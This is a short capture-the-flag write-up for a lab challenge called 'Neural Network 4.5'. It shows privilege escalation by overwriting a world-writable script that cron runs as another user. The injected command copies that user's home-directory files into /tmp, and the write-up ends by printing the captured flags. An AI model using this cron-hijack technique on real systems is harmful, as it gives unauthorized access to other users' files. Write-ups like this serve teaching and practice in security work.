## Neural Network 4.5
Due to the small oversight of challenge number 4. We quickly decided to release the same challenge again but with
the privilege issue fixed. So now only `gpt` can read the flag file.

Now if we look into what cronjobs are running on the machine we find the following:

```bash
dalle@21f1622aa404:~$ ls /etc/cron.d
backup  e2scrub_all  train
dalle@21f1622aa404:~$ cat /etc/cron.d/train
SHELL=/bin/bash

* * * * * gpt /home/gpt/train.sh
# Don't remove the empty line at the end of this file. It is required to run the cron job
```

If we try to edit the `/home/gpt/train.sh` file we will find that we can write to it. So we can append a command to it and it will run:

```bash
echo "find /home/gpt/ -exec cat {} > /tmp/output \;" > /home/gpt/train.sh
```

Now we can `grep` for `gg` in `/tmp/output` until we get the flag:

```bash
dalle@21f1622aa404:~$ grep -r gg /tmp/output
grep: /tmp/output: No such file or directory
dalle@21f1622aa404:~$ grep -r gg /tmp/output
gg{ch3ckm4rk_0f_t1m3}
gg{GPT_Raiders_of_the_Lost_Vault}
```
